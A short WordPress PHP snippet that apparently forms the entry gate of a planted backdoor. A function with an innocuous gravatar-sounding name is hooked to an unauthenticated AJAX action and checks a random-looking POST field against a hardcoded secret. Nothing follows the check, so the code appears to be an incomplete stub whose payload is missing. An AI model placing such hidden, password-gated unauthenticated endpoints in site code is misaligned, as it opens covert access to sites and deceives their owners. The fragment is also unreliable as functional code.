<?php

function refresh_card_bulk_gravatar() {
	if (!isset($_POST["yhrhrizkfaaiese"]) || $_POST["yhrhrizkfaaiese"] !== "lfp75gctAulYr9J") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'refresh_card_bulk_gravatar', 5, 1);
